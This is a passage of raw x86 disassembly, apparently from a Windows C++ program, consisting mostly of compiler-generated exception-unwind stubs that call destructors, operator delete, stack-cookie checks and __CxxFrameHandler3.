mov ecx [ ebp + 0x8 ]
jmp sub_420280
sub_449d38
mov esi [ ebp + 0x8 ]
add esi 0x12c
jmp sub_439510
sub_449d46
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449d70
mov ecx [ ebp - 0x10 ]
jmp sub_420280
sub_449d78
mov ecx [ ebp - 0x10 ]
add ecx 0x100
jmp sub_402ca0
sub_449d86
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449d8e
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_449d96
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_449d9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449dc0
mov ecx [ ebp + 0x8 ]
jmp sub_420280
sub_449dc8
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449dd0
mov ecx [ ebp + 0x8 ]
add ecx 0x100
jmp sub_402ca0
sub_449dde
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449e00
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_449e08
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_449e10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449e30
lea esi [ ebp - 0x34 ]
jmp sub_439510
sub_449e38
lea ecx [ ebp - 0x38 ]
jmp sub_427df0
sub_449e40
lea esi [ ebp - 0x20 ]
jmp sub_439510
sub_449e48
lea ecx [ ebp - 0x24 ]
jmp sub_427df0
sub_449e50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449e70
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449e7c
mov ecx [ ebp + 0x8 ]
jmp sub_4260a0
sub_449e84
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449ea0
mov ecx [ ebp + 0x8 ]
jmp sub_40a550
sub_449ea8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449ed0
mov ecx [ ebp - 0x10 ]
jmp sub_40a550
sub_449ed8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449f00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449f20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449f40
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_449f48
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_449f50
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449f58
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_449f60
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449f68
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_449f70
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449f78
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449f80
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_449f88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449fb0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449fb8
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_449fc0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449fc8
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449fd0
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_449fd8
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_449fe0
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_449fe8
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_449ff0
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_449ff8
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a000
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44a008
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a030
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44a038
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44a040
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44a048
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44a050
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a058
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44a060
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44a068
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44a070
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44a078
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44a080
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44a088
lea ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_44a090
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44a098
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44a0a0
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44a0a8
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44a0b0
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44a0b8
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44a0c0
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44a0c8
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44a0d0
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a0d8
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44a0e0
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44a0e8
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44a0f0
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44a0f8
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44a100
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44a108
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a110
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44a118
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44a120
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a140
mov ecx [ ebp - 0x10 ]
jmp sub_42c1f0
sub_44a148
mov esi [ ebp - 0x10 ]
add esi 0x248
jmp sub_439510
sub_44a156
mov ecx [ ebp - 0x10 ]
jmp sub_418cc0
sub_44a15e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a180
mov ecx [ ebp + 0x8 ]
jmp sub_42c1f0
sub_44a188
mov esi [ ebp + 0x8 ]
add esi 0x248
jmp sub_439510
sub_44a196
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a1c0
mov ecx [ ebp - 0x10 ]
jmp sub_42c1f0
sub_44a1c8
mov esi [ ebp - 0x10 ]
add esi 0x26c
jmp sub_439510
sub_44a1d6
mov ecx [ ebp - 0x10 ]
jmp sub_418cc0
sub_44a1de
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a200
mov ecx [ ebp + 0x8 ]
jmp sub_42c1f0
sub_44a208
mov esi [ ebp + 0x8 ]
add esi 0x26c
jmp sub_439510
sub_44a216
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a240
mov ecx [ ebp - 0x10 ]
jmp sub_420280
sub_44a248
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_44a250
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a258
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a280
mov ecx [ ebp + 0x8 ]
jmp sub_420280
sub_44a288
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44a290
mov ecx [ ebp + 0x8 ]
add ecx 0x100
jmp sub_402ca0
sub_44a29e
mov ecx [ ebp + 0x8 ]
jmp sub_4203e0
sub_44a2a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a2d0
mov ecx [ ebp - 0x10 ]
jmp sub_420280
sub_44a2d8
mov esi [ ebp - 0x10 ]
add esi 0x12c
jmp sub_439510
sub_44a2e6
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_44a2ee
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a2f6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a320
mov ecx [ ebp - 0x10 ]
jmp sub_41ffa0
sub_44a328
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_44a330
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a338
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a360
lea esi [ ebp - 0x430 ]
jmp sub_409b30
sub_44a36b
lea eax [ ebp - 0x418 ]
jmp sub_4105d0
sub_44a376
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x43c ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a3a0
lea esi [ ebp - 0x10 ]
jmp sub_409b30
sub_44a3a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a3d0
mov eax [ ebp - 0x1c ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a3dc
mov eax [ ebp - 0x1c ]
add eax 0x8
push eax
call sub_40a720
retn
sub_44a3e9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a410
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a720
retn
sub_44a41d
mov ecx [ ebp - 0x10 ]
jmp sub_40a550
sub_44a425
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a440
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a44c
mov ecx [ ebp - 0x10 ]
jmp sub_40e930
sub_44a454
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a470
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a47c
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a488
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a494
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a4b0
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a4b8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_44a4c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a4e0
lea ecx [ ebp - 0x24 ]
jmp sub_422220
sub_44a4e8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a510
mov ecx [ ebp - 0x10 ]
jmp sub_431da0
sub_44a518
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a540
mov ecx [ ebp + 0x8 ]
jmp sub_431da0
sub_44a548
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a570
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a57c
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a584
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_44a58f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a5b0
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44a5b8
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44a5c2
lea ecx [ ebp - 0x20 ]
jmp sub_405f40
sub_44a5ca
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44a5d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a5f0
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44a5f8
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44a602
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44a60a
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44a612
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a630
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44a638
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44a640
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a648
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44a650
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44a658
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44a660
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a680
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a68c
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a698
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6a4
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6b0
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6bc
mov ecx [ ebp - 0x10 ]
jmp sub_41ffa0
sub_44a6c4
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6d0
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6dc
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6e8
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a6f4
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a6fc
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a708
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a714
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a720
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a72c
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a734
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a740
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a748
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a754
mov ecx [ ebp - 0x10 ]
jmp sub_420280
sub_44a75c
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a768
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_44a770
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a790
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a79c
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7a8
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7b4
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7c0
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7cc
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7d8
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7e4
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7f0
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a7fc
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a808
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a814
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a820
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a82c
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a838
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a844
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a850
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a85c
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a868
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a874
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a880
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44a88c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a8b0
mov ecx [ ebp - 0x10 ]
jmp sub_4203e0
sub_44a8b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a8e0
mov esi [ ebp - 0xa44 ]
jmp sub_40f850
sub_44a8eb
lea eax [ ebp - 0xa54 ]
push eax
call sub_40f890
retn
sub_44a8f8
lea ecx [ ebp - 0xa58 ]
jmp sub_40f9c0
sub_44a903
lea esi [ ebp - 0xa44 ]
jmp sub_409b30
sub_44a90e
lea esi [ ebp - 0xa44 ]
jmp sub_409b30
sub_44a919
lea esi [ ebp - 0xa5c ]
jmp sub_409b30
sub_44a924
lea esi [ ebp - 0xa5c ]
jmp sub_409b30
sub_44a92f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa60 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44a960
lea eax [ ebp - 0x668 ]
jmp sub_40bee0
sub_44a96b
lea eax [ ebp - 0x668 ]
push eax
call sub_40a500
retn
sub_44a978
lea ecx [ ebp - 0x640 ]
jmp sub_405f40
sub_44a983
lea eax [ ebp - 0x668 ]
jmp sub_40bee0
sub_44a98e
lea eax [ ebp - 0x660 ]
jmp sub_402d20
sub_44a999
lea ecx [ ebp - 0x660 ]
jmp sub_402ca0
sub_44a9a4
lea eax [ ebp - 0x64c ]
jmp sub_40ab00
sub_44a9af
lea eax [ ebp - 0x664 ]
jmp sub_40bee0
sub_44a9ba
lea eax [ ebp - 0x664 ]
push eax
call sub_40a500
retn
sub_44a9c7
lea eax [ ebp - 0x66c ]
jmp sub_40bee0
sub_44a9d2
lea eax [ ebp - 0x66c ]
push eax
call sub_40a500
retn
sub_44a9df
lea ecx [ ebp - 0x658 ]
jmp sub_402ca0
sub_44a9ea
lea ecx [ ebp - 0x654 ]
jmp sub_402ca0
sub_44a9f5
lea ecx [ ebp - 0x65c ]
jmp sub_402ca0
sub_44aa00
lea eax [ ebp - 0x668 ]
jmp sub_40bee0
sub_44aa0b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x66c ]
mov ecx [ edx - 0x670 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44aa40
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44aa48
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_44aa52
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44aa5a
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44aa64
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44aa6c
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44aa76
lea eax [ ebp - 0x1c ]
jmp sub_40ab00
sub_44aa7e
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44aa86
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44aa8e
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44aa96
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44aac0
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44aac8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44aaf0
jmp sub_412940
j_sub_412940#4
jmp sub_412940
sub_44aafa
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ab20
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44ab28
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44ab30
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44ab38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ab60
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44ab68
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44ab70
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44ab78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44aba0
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44aba8
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44abb2
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44abba
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44abc2
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44abca
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44abd2
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44abda
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44abe2
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44abea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
j_sub_412940#3
jmp sub_412940
sub_44ac15
lea ecx [ ebp - 0x5c ]
jmp sub_402ca0
sub_44ac1d
lea ecx [ ebp - 0x4c ]
jmp sub_402ca0
sub_44ac25
lea ecx [ ebp - 0x48 ]
jmp sub_402ca0
sub_44ac2d
lea eax [ ebp - 0x48 ]
jmp sub_402d20
sub_44ac35
lea eax [ ebp - 0x4c ]
jmp sub_402d20
sub_44ac3d
lea esi [ ebp - 0x60 ]
jmp sub_41f4f0
sub_44ac45
lea eax [ ebp - 0x5c ]
jmp sub_402d20
sub_44ac4d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ac80
lea eax [ ebp - 0x424 ]
jmp sub_402d20
sub_44ac8b
lea ecx [ ebp - 0x424 ]
jmp sub_402ca0
sub_44ac96
lea ecx [ ebp - 0x42c ]
jmp sub_402ca0
sub_44aca1
lea ecx [ ebp - 0x428 ]
jmp sub_402ca0
sub_44acac
lea eax [ ebp - 0x428 ]
jmp sub_402d20
sub_44acb7
lea eax [ ebp - 0x42c ]
jmp sub_402d20
sub_44acc2
lea eax [ ebp - 0x424 ]
jmp sub_402d20
sub_44accd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x42c ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ad00
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad08
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad10
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad18
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad20
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad28
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad30
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad38
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad40
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad48
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad50
lea ecx [ ebp - 0x50 ]
jmp sub_402ca0
sub_44ad58
lea eax [ ebp - 0x50 ]
jmp sub_402d20
sub_44ad60
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
